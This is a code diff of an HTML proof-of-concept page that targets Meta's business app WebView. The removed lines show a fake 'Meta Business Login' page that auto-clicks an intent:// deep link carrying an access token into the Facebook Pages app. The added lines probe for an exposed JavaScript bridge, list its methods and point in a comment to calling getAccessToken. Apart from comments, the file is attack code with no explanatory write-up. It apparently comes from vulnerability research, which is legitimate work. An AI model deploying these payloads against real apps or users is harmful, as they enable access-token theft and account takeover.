@@ -1,13 +1,26 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Meta JS Bridge PoC</title>
+</head>
 <body>
-    <h1>Meta Business Login</h1>
-    <br><br>
-    <a id="link" href="intent://auth?access_token=SUCCESS_TOKEN_LEAKED_1337#Intent;scheme=fb-biz;package=com.facebook.pages.app;end" style="font-size: 50px;">Continue as User</a>
-
+    <h1>Testing JS Bridge Exposure</h1>
     <script>
+        // Once the page loads, Meta's WebView will inject the bridge.
+        // It is usually exposed globally as the name of the extension.
         window.onload = function() {
-            document.getElementById("link").click();
+            if (window.bizapp_extension) {
+                alert("Boom! JS Bridge is exposed!");
+                // You can enumerate methods by iterating over the object:
+                let methods = Object.keys(window.bizapp_extension);
+                document.write("Exposed Methods: " + methods.join(", "));
+                
+                // If you find a token method, you could do:
+                // window.bizapp_extension.getAccessToken(...);
+            } else {
+                alert("Bridge not found, checking alternative namespaces...");
+                // Sometimes it's under window._fbBatchedBridge or window.FacebookLite
+            }
         };
     </script>
 </body>
